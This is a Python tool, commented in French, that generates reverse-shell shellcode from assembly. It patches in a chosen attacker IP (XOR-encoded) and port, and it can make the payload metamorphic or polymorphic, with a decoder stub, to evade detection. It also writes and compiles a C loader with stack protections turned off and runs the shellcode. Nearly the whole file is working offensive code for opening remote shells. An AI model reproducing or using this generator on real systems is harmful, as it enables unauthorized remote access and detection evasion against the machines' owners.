#!/usr/bin/env python3
### ==============================================================================
### Created by Migoliatte : https://github.com/migoliatte/Invader.git
### Automatic creation of a reverse shell (via shellcode) to inject into a program (C example directly available in git). 
### There is the possibility to change the reverse shell ip and port and make the shell metamorphic and / or polymorphic.
### ==============================================================================

import subprocess
import re
import os
import sys
import socket
import random


def polymorphisme(verbose, shellcode, programmeAsm_Path, size):
    print("<---------- Creation du shellCode polymorphisme ---------->")
    shellPoly = ""
    for i in range(2, len(shellcode), 4):
        if shellcode[i:i+2] == "00":
            print("Il y a un ou plusieurs NullBytes  " + shellcode[i:i+2])
        value = hex(int(shellcode[i:i+2], 16)+1)
        if(len(value) == 3):
            value = "0x0"+value[2]
        shellPoly += "\\x"+str(value[2:4])
    if(verbose):
        print("Ajout de 1 au shellcode")
        print(shellPoly)

    print("<---------- Creation du shellCode permettant le dechiffrement ---------->")
    resultfinal = shellcodeCreation(
        verbose,  "decompileur", programmeAsm_Path, 0)
    for i in range(2, len(resultfinal), 4):
        if resultfinal[i:i+2] == "00":
            tmp = resultfinal[0:i-2]
            tmp += "\\x01"
            tmp += resultfinal[i+2:]
            resultfinal = tmp
        elif resultfinal[i:i+2] == "57":
            print(
                "<---------- Changement de la taille du shellcode dans decompileur.asm ---------->")
            print("Taille du shellcode : "+size)
            tmp = resultfinal[0:i-2]
            tmp += "\\x" + hex(int(size)).split("x")[1]
            tmp += resultfinal[i+2:]
            resultfinal = tmp
    return resultfinal+shellPoly


def lancementCodeC(verbose, programmeC_Name, programmeC_Path):
    print("<---------- Compilation et lancement de " +
          programmeC_Path+programmeC_Name+".c ---------->")

    if(verbose):
        print("Lancement de la commande gcc -o "+programmeC_Path+programmeC_Name+".out " +
              programmeC_Path+programmeC_Name+".c -z execstack -m32 -fno-stack-protector")
    os.system("gcc -o "+programmeC_Path+programmeC_Name+".out "+programmeC_Path +
              programmeC_Name+".c -z execstack -m32 -fno-stack-protector")
    if(verbose):
        print("Lancement de l'executable "+programmeC_Path+programmeC_Name)
    os.system(programmeC_Path+programmeC_Name+".out")


def createFileC(verbose, programmeC_Name, programmeC_Path, shellcode):
    print("<---------- Création du fichier " +
          programmeC_Path+programmeC_Name+".c ---------->")

    with open(programmeC_Path+programmeC_Name+".c", "w") as file:
        file.write('#include <stdio.h>\n#include <string.h>\n\n')
        file.write('int main(void)\n{\n')
        file.write('\tunsigned char code[] = \\\n')
        file.write('\t\"'+shellcode+'\" ;\n')
        file.write('\tprintf("Shellcode length: %d\\n", strlen(code)); \n')
        file.write('\tvoid (*s)() = (void *)code;\n\ts();\n')
        file.write('\treturn 0;\n}')
    if(verbose == 3):
        print('#include <stdio.h>\n#include <string.h>\n')
        print('int main(void)\n{')
        print('\tunsigned char code[] = \\')
        print('\t\"'+shellcode+'\" ;')
        print('\tprintf("Shellcode length: %d\\n", strlen(code)); ')
        print('\tvoid (*s)() = (void *)code;\n\ts();')
        print('\treturn 0;\n}')
    elif(verbose):
        print("Le fichié a été crée et completé avec le nouveau shellcode")


def portInsert(verbose, shellcode, port):
    print("<---------- Remplacement du port dans le shellcode ---------->")
    shellcode = shellcode.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
        b1=port[4:6],
        b2=port[2:4]
    ))
    if(verbose):
        print("Remplacement de \\x66\\x68\\x11\\x5c par \\x66\\x68\\x{b1}\\x{b2}".format(
            b1=port[4:6],
            b2=port[2:4]
        ))
    return shellcode


def ipInsert(verbose, ip, shellcode, xor_byte):
    print("<---------- Remplacement de l'ip dans le shellcode ---------->")
    ip_bytes = []
    for i in range(0, 4):
        ip_bytes.append(hex(ip[i] ^ xor_byte))
    array_hex_ip = []
    for i in range(0, 4):
        if(len(ip_bytes[i][2:]) == 1):
            hex_ip_bytes = ip_bytes[i][1:2]+"0"+ip_bytes[i][2]
            array_hex_ip.append(hex_ip_bytes)
        else:
            array_hex_ip.append(ip_bytes[i][1:])

    shellcode = shellcode.replace("\\x35\\x80\\xff\\xff\\xfe", "\\x35\\{b1}\\{b2}\\{b3}\\{b4}".format(
        b1=array_hex_ip[0],
        b2=array_hex_ip[1],
        b3=array_hex_ip[2],
        b4=array_hex_ip[3]
    ))
    if(verbose):
        print("Remplacement de \\x35\\x80\\xff\\xff\\xfe par \\x35\\{b1}\\{b2}\\{b3}\\{b4}".format(
            b1=array_hex_ip[0],
            b2=array_hex_ip[1],
            b3=array_hex_ip[2],
            b4=array_hex_ip[3]
        ))
    return shellcode


def xorInsert(verbose, shellcode, xor_byte):
    print("<---------- Remplacement du XOR dans le shellcode ---------->")
    if(len(hex(xor_byte)[2:]) == 1):
        hex_xor_byte = hex(xor_byte)[1:2]+"0"+hex(xor_byte)[2]

        shellcode = shellcode.replace("\\xb8\\xff\\xff\\xff\\xff",
                                      "\\xb8\{x}\{x}\{x}\{x}".format(x=hex_xor_byte))
        if(verbose):
            print("Remplacement de \\xb8\\xff\\xff\\xff\\xff par \\xb8\{x}\{x}\{x}\{x}".format(
                x=hex_xor_byte))
    else:
        shellcode = shellcode.replace("\\xb8\\xff\\xff\\xff\\xff",
                                      "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x=hex(xor_byte)[1:3]))
        if(verbose):
            print("Remplacement de \\xb8\\xff\\xff\\xff\\xff par \\xb8\{x}\{x}\{x}\{x}".format(
                x=hex(xor_byte)[1:3]))
    return shellcode


def xorFinder(verbose, ip):
    print("<---------- Génération du XOR pour l'ip ---------->")
    xor_byte = 0
    for i in range(1, 256):
        matched_a_byte = False
        for octet in ip:
            if i == octet:
                matched_a_byte = True
                break

        if not matched_a_byte:
            xor_byte = i
            break
    if xor_byte == 0:
        print("Failed to find a valid XOR byte")
        exit(1)
    if(verbose):
        print("Le xor adéquat pour l'ip : "+str(ip)+" est "+str(xor_byte))
    return xor_byte


def creationShellcodeModified(verbose, ip, shellcode, port, xor_byte):
    print("<---------- Modification du shellcode avec une nouveau port et/ou une nouvelle IP ---------->")

    shellcode = xorInsert(verbose, shellcode, xor_byte)
    shellcode = ipInsert(verbose, ip, shellcode, xor_byte)
    shellcode = portInsert(verbose, shellcode, port)
    if(verbose):
        print("<----------  Shellcode modifié ---------->")
        print(shellcode)
    return shellcode


def xorChanger(verbose, line, test, file):
    if "xor" in line:
        if(test[1][:-1] == test[2]):
            if(random.randint(0, 1)):
                file.write("and " + test[2] + ", " + str("0x01010101") +
                           "\nand " + test[2] + ", " + str("0x02020202")+"\n")
                if(verbose == 3):
                    print("Changement de "+line+" en and " + test[2] + ", " + str("0x01010101") +
                          " and " + test[2] + ", " + str("0x02020202"))
                return True
            elif(random.randint(0, 1)):
                if(verbose == 3):
                    print("Changement de "+line+" en sub " +
                          test[2] + ", " + test[2])
                file.write("sub " + test[2] + ", " + test[2]+"\n")
                return True
    return False


def movChanger(verbose, line, test, file):
    if "mov" in line:
        if(test[1][:-1] in set(["al", "bl", "cl", "dl", "ax", "eax", "edx", "ecx", "ebx", "esp", "ebp", "esp"])):
            if(test[2] not in set(["al", "bl", "cl", "dl", "ax" "eax", "edx", "ecx", "ebx", "esp", "ebp", "esp"]) and test[2][0:2] == "0x"):
                if(not ((len(test[2]) == 10 and test[2] == "0xffffffff") or (len(test[2]) == 6 and test[2] == "0xffff") or (len(test[2]) == 4 and test[2] == "0xff"))):
                    if(random.randint(0, 1)):
                        value = hex(int(test[2], 16)+1)
                        if(len(value) == 3):
                            value = "0x0"+value[2]
                        if(verbose) == 3:
                            print("Changement de "+line+" en mov " +
                                  test[1][:-1] + ", "+value+"dec " + test[1][:-1])
                        file.write(
                            "mov " + test[1][:-1] + ", "+value+"\n dec " + test[1][:-1]+"\n")
                        return True
                    # il faut rajouter un test pour savoir si ça a été fait ou aps
                    elif(not ((len(test[2]) == 10 and test[2] == "0x0000001") or (len(test[2]) == 6 and test[2] == "0x0001") or (len(test[2]) == 4 and test[2] == "0x01")) and random.randint(0, 1)):
                        value = hex(int(test[2], 16)-1)
                        if(len(value) == 3):
                            value = "0x0"+value[2]
                        if(verbose == 3):
                            print("Changement de "+line+" en mov " +
                                  test[1][:-1] + ", "+value+"inc " + test[1][:-1])
                        file.write(
                            "mov " + test[1][:-1] + ", "+value+"\n inc " + test[1][:-1]+"\n")
                        return True
    return False


def metamorphisme(verbose, programme_Name, programme_Path, port, ip, xor_byte):
    print("<---------- Creation du shellCode metamorphique ---------->")
    with open(programme_Path+programme_Name+".asm") as f:
        datafile = f.readlines()
    if(verbose):
        print("Creation de "+programme_Path+programme_Name+"_metamorph.asm")
    with open(programme_Path+programme_Name+"_metamorph.asm", "w") as file:
        for line in datafile:
            test = line.split()
            if len(test) == 3:
                if(test[2] == "0x5c11"):
                    test[2] = port

                if(test[2] == "0xffffffff"):
                    hex_xor_byte = "0"+hex(xor_byte)[2]
                    hex_xor_byte = "0" + \
                        hex(xor_byte)[1:2]+hex_xor_byte + \
                        hex_xor_byte+hex_xor_byte+hex_xor_byte
                    test[2] = hex_xor_byte

                if(test[2] == "0xfeffff80"):
                    ip_bytes = []
                    ip_byte_clear = "0x"
                    for i in range(0, 4):
                        if(len(hex(ip[i] ^ xor_byte)) == 3):
                            ip_bytes.append("0"+hex(ip[i] ^ xor_byte)[2:4])
                        else:
                            ip_bytes.append(hex(ip[i] ^ xor_byte)[2:4])
                    ip_byte_clear += ip_bytes[3]
                    ip_byte_clear += ip_bytes[2]
                    ip_byte_clear += ip_bytes[1]
                    ip_byte_clear += ip_bytes[0]
                    test[2] = ip_byte_clear

            if(not xorChanger(verbose, line, test, file) and not movChanger(verbose, line, test, file)):
                file.write(line)


def CheckNullBytes(shellcode, nbrLine):
    for i in range(0, len(shellcode), 2):
        if shellcode[i:i+2] == "00":
            print("Il y a un ou plusieurs NullBytes à la " +
                  str(nbrLine)+"ieme ligne de l'opcode : " + shellcode)
            return 1
    return 0


def objdump(verbose,  programme_Path, programme_Name):
    print("<---------- Lancement de ObjDump en cours ---------->")
    os.system("nasm -f elf "+programme_Path+programme_Name+".asm  && ld " +
              programme_Path+programme_Name+".o -m elf_i386 -o "+programme_Path+programme_Name)
    if(verbose):
        print("Lancement de la commande objdump -d " +
              programme_Path+programme_Name)
    objdump = subprocess.run(
        'objdump -d '+programme_Path+programme_Name, shell=True, stdout=subprocess.PIPE)
    objdump = objdump.stdout.decode("utf-8")
    if(verbose == 3):
        print("Resultat de OBJDUMP :"+objdump)
    objdump = objdump.replace("\t", "")
    result = re.findall(":[0-9a-f ]{21}", objdump)
    return result


def cleanOpCode(verbose, programme_Path, programme_Name, metamorphismeSelected):
    resultfinal = []
    nbrLine = 0
    nullByte = 0
    if(metamorphismeSelected):
        programme_Name += "_metamorph"
    for res in objdump(verbose, programme_Path, programme_Name):
        nullByte += CheckNullBytes(res, nbrLine)
        resultfinal.append(res[1:].replace(" ", ""))
        nbrLine += 1

    print("<---------- Check des NUllsBytes en cours ---------->")
    if nullByte > 0:
        print("Des NullBytes ont été détécté.")
    elif(verbose):
        print("Aucun NullBytes dans ce shellcode ! ")

    print("<---------- Nettoyage de l'opcode en cours ---------->")
    resultfinal = "".join(resultfinal)

    if(verbose):
        print("Opcode nettoyé : "+resultfinal)
    return resultfinal


def shellcodeCreation(verbose, programme_Name, programme_Path, metamorphismeSelected):
    resultfinal = cleanOpCode(verbose, programme_Path,
                              programme_Name, metamorphismeSelected)
    print("<---------- Génération de l'exploit en cours ---------->")
    exploit = ""
    for i in range(0, len(resultfinal), 2):
        exploit += "\\x"+resultfinal[i:i+2]
    if(verbose):
        print(exploit)
        print("Taille de l'exploit : "+str(int(len(resultfinal)/2)))
    return exploit


def all(verbose, programmeC_Name, programmeC_Path, port, ip, metamorphismeSelected, polymorphismSelected):
    shellcode = shellcodeCreation(
        verbose, programmeC_Name, programmeC_Path, metamorphismeSelected)
    programmeC_Path = programmeC_Path.split("asm")
    programmeC_Path = programmeC_Path[0]+"c"+programmeC_Path[1]

    if(port or ip):
        if(not port):
            port = "0x5c11"  # 4444
        if(not ip):
            ip = bytes(b'\x7f\x00\x00\x01')  # 127.0.0.1
        xor_byte = xorFinder(verbose, ip)
        modifiedShellcode = creationShellcodeModified(
            verbose, ip, shellcode, port, xor_byte)
        if(metamorphismeSelected):
            metamorphisme(verbose, programmeC_Name, "asm/", port, ip, xor_byte)
        if(polymorphismSelected):
            size = str(int(len(modifiedShellcode)/4))
            shellcode = polymorphisme(verbose, modifiedShellcode, "asm/", size)
        createFileC(verbose, programmeC_Name,
                    programmeC_Path, shellcode)
    else:
        if(polymorphismSelected):
            size = str(int(len(shellcode)/4))
            shellcode = polymorphisme(verbose, shellcode, "asm/", size)
        createFileC(verbose, programmeC_Name, programmeC_Path, shellcode)
    lancementCodeC(verbose, programmeC_Name, programmeC_Path)


def verifIfExploitIsSet(programmeC_Name, programmeC_Path):
    result = input("Avez vous pensé à changer la variable 'shellcode' de " +
                   programmeC_Path+programmeC_Name+".c ([y/yes/o/oui]/[n/no/non]) :  ")
    result = result.lower()
    if(result == "y" or result == "yes" or result == "o" or result == "oui" or result == ""):
        print("Très bien, continuons !")
    elif(result == "n" or result == "no" or result == "non"):
        print("Allez le modifier !")
        exit()
    else:
        print("Merci de répondre y/yes/o/oui ou n/no/non merci !")
        exit()


def recupIp(verbose, ip):
    print("<---------- Récupération de l'ip ---------->")
    validIp = 0
    if(not ip or ip.find("-") == 0):
        ip = input(
            "Ip par défaut : 127.0.0.1 . Veuillez entrer une ip valide (exemple 127.0.0.1):")
    while validIp == 0:
        ip = ip.split(".")
        if(len(ip) == 4):
            for eachIp in ip:
                if(eachIp != "" and 0 <= int(eachIp) < 255):
                    validIp = 1
                else:
                    print("Problème d'ip (valeur pas comprise entre 0 et 255)")
                    validIp = 0
                    break
        else:
            validIp = 0
            print("Problème d'ip (il y a trop ou pas assez de . )")
        if(validIp == 0):
            ip = input("Ip actuelle : "+".".join(ip) +
                       " Veuillez entrer une IP valide (exemple 127.0.0.1):")
    ip = (".".join(ip))
    if(verbose):
        print("L'ip selectionné est : "+ip +
              " soit : "+str(socket.inet_aton(ip)))
    ip = socket.inet_aton(ip)
    return ip


def recupPort(verbose, port):
    print("<---------- Récupération du port ---------->")
    validPort = 0
    if(not port or port.find("-") == 0):
        port = input(
            "Port par défaut : 4444 . Veuillez entrer un port valide (de 1024 à 65353):")
    while validPort == 0:
        if(port != "" and 1024 <= int(port) < 65353):
            validPort = 1
        else:
            print("Problème de port")
            port = input("Port actuel : "+port +
                         " Veuillez entrer un port valide (de 1024 à 65353):")
    if(verbose):
        print("Le port selectionné est : "+port +
              " soit : "+str(hex(socket.htons(int(port)))))
    port = hex(socket.htons(int(port)))
    return port


def nameCleaner(verbose, fileName):
    print("<---------- Creation des noms de fichiers ---------->")
    programmeName = fileName.split("/")
    programmePath = ""
    arrayName = []
    for i in range(0, len(programmeName)-1):
        programmePath += programmeName[i]+"/"
    programmeName = programmeName[len(programmeName)-1]
    programmeName = programmeName.split(".asm")
    programmeName = programmeName[0].split(".c")
    programmeName = programmeName[0]
    if(verbose):
        print("Nom du programme : "+programmeName)
        print("Nom de la route : "+programmePath)
    arrayName.append(programmeName)
    arrayName.append(programmePath)
    return arrayName


def recupArgument(verbose, fileName):
    print("<---------- Récupération du nom du fichier en cours ---------->")
    file_test = subprocess.run(
        "ls "+fileName, shell=True, stdout=subprocess.PIPE)
    exist = 0
    name = ""
    if(file_test.returncode != 0 or fileName == "" or fileName.find("-") == 0):
        while exist == 0:
            os.system(
                "echo Vous êtes actuellement ici : $(pwd), dans votre dossier il y a : $(ls)")
            name = input("Entrez le nom du fichier :")
            file_test = subprocess.run(
                "ls "+name, shell=True, stdout=subprocess.PIPE)
            if(file_test.returncode != 0 or name == "" or name.find("-") == 0):
                print("Le fichier "+name+" n'existe pas !")
            else:
                exist = 1
    else:
        if(verbose):
            print("Nom du fichier complète : "+fileName)
        return fileName
    if(verbose):
        print("Nom du fichier complète  : "+name)
    return name


def exemple():
    print("<---------------------------------------- EXEMPLES ---------------------------------------->")
    print("Exemple : python "+sys.argv[0] +
          " -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c ../final/c/fnl_reverse_shell.c " +
          "\n//     Compile et lance le programme     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -p 4444 -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode du fichier en changeant le port     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -i 127.0.0.1 -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode du fichier en changeant l'ip     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444 " +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm en changeant l'ip et le port     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444 -v -M -P" +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm en changeant l'ip et le port avec le polymorphisme et le metamorphisme activé   \\\\")
    print("<---------------------------------------- EXEMPLES ---------------------------------------->")


def help():
    print("<------------------------------------------ HELP ------------------------------------------>")
    print("-h Affiche ce message")
    print("-e Affiche des exemples de commandes")
    print("-v Active le mode verbosité")
    print("-vvv Active le mode haute verbosité (objdump)")
    print("-s Création de lu shellcode")
    print("-c compile un fichier.c et le lance")
    print("-i Changement de l'ip dans le shellCode")
    print("-p Changement du port dans le shellCode")
    print("-M Activation du metamorphisme du shellcode")
    print("-P Activation du polymorphisme du shellcode")
    print("<------------------------------------------ HELP ------------------------------------------>")
    exit()


def menu():
    array = [0, 0, 0, 0, "", 0, "", 0, "", 0, 0]
    for i in range(0, len(sys.argv)):
        if str(sys.argv[i]) == "-h":
            array[0] = 1
        if str(sys.argv[i]) == "-e":
            array[0] = 2
        elif str(sys.argv[i]) == "-v":
            array[3] = 1
        elif str(sys.argv[i]) == "-vvv":
            array[3] = 3
        elif str(sys.argv[i]) == "-M":
            array[9] = 1
        elif str(sys.argv[i]) == "-P":
            array[10] = 1
        elif str(sys.argv[i]) == "-p":
            array[5] = 1
            if(len(sys.argv) > i+1):
                array[6] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-i":
            array[7] = 1
            if(len(sys.argv) > i+1):
                array[8] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-s":
            array[1] = 1
            if(len(sys.argv) > i+1):
                array[4] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-c":
            array[2] = 1
            if(len(sys.argv) > i+1):
                array[4] = sys.argv[i+1]
    return array


def main():
    asciiArt()
    menuResult = menu()
    port = ""
    ip = ""
    shellcode = ""
    if(menuResult[3] == 3):
        print("Tableau des choix utilisateurs : "+str(menuResult))
    if menuResult[0] == 1 or len(sys.argv) == 1:
        help()
    elif menuResult[0] == 2 or (menuResult[1] == 0 and menuResult[2] == 0):
        exemple()
    else:
        fileName = recupArgument(menuResult[3], menuResult[4])
        arrayName = nameCleaner(menuResult[3], fileName)
        if(menuResult[5]):
            port = recupPort(menuResult[3], menuResult[6])
        if(menuResult[7]):
            ip = recupIp(menuResult[3], menuResult[8])
        if menuResult[1] == 1 and menuResult[2] == 1:
            all(menuResult[3], arrayName[0],
                arrayName[1], port, ip, menuResult[9], menuResult[10])
        elif menuResult[1] == 1:
            shellcode = shellcodeCreation(
                menuResult[3], arrayName[0], arrayName[1], menuResult[9])
            if(menuResult[5] or menuResult[7]):
                xor_byte = xorFinder(menuResult[3], ip)
                shellcode = creationShellcodeModified(
                    menuResult[3], ip, shellcode, port, xor_byte)
            if(not menuResult[3]):
                print(shellcode)
            if(menuResult[10]):
                size = str(int(len(shellcode)/4))
                polymorphisme(menuResult[3], shellcode, arrayName[1], size)
        elif menuResult[2] == 1:
            verifIfExploitIsSet(arrayName[0], arrayName[1])
            lancementCodeC(menuResult[3], arrayName[0], arrayName[1])
        else:
            help()


def asciiArt():
    print("""
         ____  ____   __ __   ____  ___      ___  ____  
        |    ||    \ |  |  | /    ||   \    /  _]|    \ 
         |  | |  _  ||  |  ||  o  ||    \  /  [_ |  D  )
         |  | |  |  ||  |  ||     ||  D  ||    _]|    / 
         |  | |  |  ||  :  ||  _  ||     ||   [_ |    \ 
         |  | |  |  | \   / |  |  ||     ||     ||  .  \\
        |____||__|__|  \_/  |__|__||_____||_____||__|\_|

   """)


if __name__ == "__main__":
    main()
